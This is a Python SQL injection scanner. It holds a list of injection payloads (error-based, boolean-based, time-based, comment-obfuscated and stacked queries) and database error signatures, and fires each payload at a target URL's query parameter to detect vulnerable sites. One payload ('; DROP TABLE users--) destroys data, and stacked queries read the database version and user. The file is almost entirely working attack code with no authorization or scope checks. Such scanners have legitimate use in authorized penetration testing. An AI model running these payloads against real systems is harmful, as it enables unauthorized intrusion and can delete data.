import requests
from urllib.parse import urlparse
import time

# Comprehensive SQLi payloads
SQLI_PAYLOADS = [
    # Error-based
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "\" OR \"1\"=\"1",
    "' OR '1'='1'--",
    "'; DROP TABLE users--",
    "' AND (SELECT 1 FROM dual) --",
    "' AND (SELECT count(*) FROM tab) --",

    # Boolean-based
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND '1'='1",
    "' AND '1'='2",
    "' OR 'a'='a",
    "' OR 'a'='b",
    "1' AND 1=1--",
    "1' AND 1=2--",

    # Time-based
    "' OR SLEEP(5)--",
    "' OR '1'='1' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' || SLEEP(5)--",
    "'%2bSLEEP(5)--",
    "\"; SELECT pg_sleep(5)--",

    # Obfuscated
    "'/**/OR/**/'1'='1",
    "'/*!50000OR*/'1'='1",
    "'/**/UNION/**/SELECT/**/NULL--",
    "'||'1'=='1",
    "'-- -",

    # Hex-based
    "' AND 0x50=0x50 --",
    "' AND 0x41=0x42 --",

    # Stack queries (if multiple statements allowed)
    "'; SELECT version();--",
    "'; SELECT user();--",
    "'; SELECT @@version;--"
]

# Known error signatures across DBs
SQLI_ERRORS = [
    "sql syntax", "mysql", "warning", "unterminated", "query failed",
    "you have an error in your sql syntax", "ORA-00933", "ORA-00936", "ORA-01756",
    "SQLite3::SQLException", "PG::SyntaxError", "unclosed quotation mark",
    "Microsoft OLE DB Provider for SQL Server", "Incorrect syntax near",
    "fatal error", "syntax error at or near"
]

def scan_sql_injection(target_url):
    parsed = urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    results = {
        "target": target_url,
        "vulnerable": False,
        "payloads": [],
        "reflected_urls": [],
        "details": []
    }

    for payload in SQLI_PAYLOADS:
        test_url = f"{base}?input={payload}"

        try:
            start_time = time.time()
            response = requests.get(test_url, timeout=10)
            duration = round(time.time() - start_time, 2)

            lower_body = response.text.lower()

            # Error-based detection
            if any(err in lower_body for err in SQLI_ERRORS):
                results["vulnerable"] = True
                results["payloads"].append(payload)
                results["reflected_urls"].append(test_url)
                results["details"].append({
                    "type": "error-based",
                    "payload": payload,
                    "url": test_url
                })

            # Boolean-based
            elif payload in ["' AND 1=1--", "' AND 1=2--", "' AND '1'='1", "' AND '1'='2"]:
                results["details"].append({
                    "type": "boolean-based",
                    "payload": payload,
                    "url": test_url,
                    "response_length": len(response.text)
                })

            # Time-based
            elif "sleep" in payload.lower() or "delay" in payload.lower() or "pg_sleep" in payload.lower():
                if duration >= 5:
                    results["vulnerable"] = True
                    results["payloads"].append(payload)
                    results["reflected_urls"].append(test_url)
                    results["details"].append({
                        "type": "time-based",
                        "payload": payload,
                        "url": test_url,
                        "delay": duration
                    })

        except Exception as e:
            results["details"].append({
                "error": str(e),
                "payload": payload,
                "url": test_url
            })

    return results
